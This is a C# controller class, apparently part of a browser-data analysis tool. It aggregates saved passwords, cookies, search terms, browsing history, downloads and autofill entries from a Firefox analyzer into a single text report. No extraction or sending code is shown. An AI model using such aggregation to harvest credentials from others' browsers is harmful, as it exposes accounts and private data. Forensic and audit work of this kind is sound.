using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Controller {
    public class Controller {
        private List<BrowserAnalyzer.BrowserAnalyzer> analyzers =
            new List<BrowserAnalyzer.BrowserAnalyzer>();

        public Controller() {
            // Add the wanted browsers analyzers
            // TODO: Ask for the directory. If none, choose the default one.
            //analyzers.Add(new ChromeAnalyzer.ChromeAnalyzer());
            analyzers.Add(new FirefoxAnalyser.FirefoxAnalyzer());
        }

        public string getDownloads() {
            string res = "--------DOWNLOADS--------\r\n";
            foreach (BrowserAnalyzer.BrowserAnalyzer ba in analyzers)
                res += ba.getDownloads();
            return res;
        }

        public string getPasswords() {
            string res = "--------PASSWORDS--------\r\n";
            foreach (BrowserAnalyzer.BrowserAnalyzer ba in analyzers)
                res += ba.getPasswords();
            return res;
        }

        public string getCookies() {
            string res = "--------COOKIES--------\r\n";
            foreach (BrowserAnalyzer.BrowserAnalyzer ba in analyzers)
                res += ba.getCookies();
            return res;
        }

        public string getSearches() {
            string res = "--------SEARCHES--------\r\n";
            foreach (BrowserAnalyzer.BrowserAnalyzer ba in analyzers)
                res += ba.getSearches();
            return res;
        }

        public string getHistory() {
            string res = "--------BROWSING--------\r\n";
            foreach (BrowserAnalyzer.BrowserAnalyzer ba in analyzers)
                res += ba.getHistory();
            return res;
        }

        public string getAutofills() {
            string res = "--------AUTOFILLS--------\r\n";
            foreach (BrowserAnalyzer.BrowserAnalyzer ba in analyzers)
                res += ba.getAutofills();
            return res;
        }

        public string getAllInfo() {
            string res = getDownloads();
            res += "\r\n" + getPasswords();
            res += "\r\n" + getCookies();
            res += "\r\n" + getSearches();
            res += "\r\n" + getHistory();
            res += "\r\n" + getAutofills();

            return res;
        }
    }
}
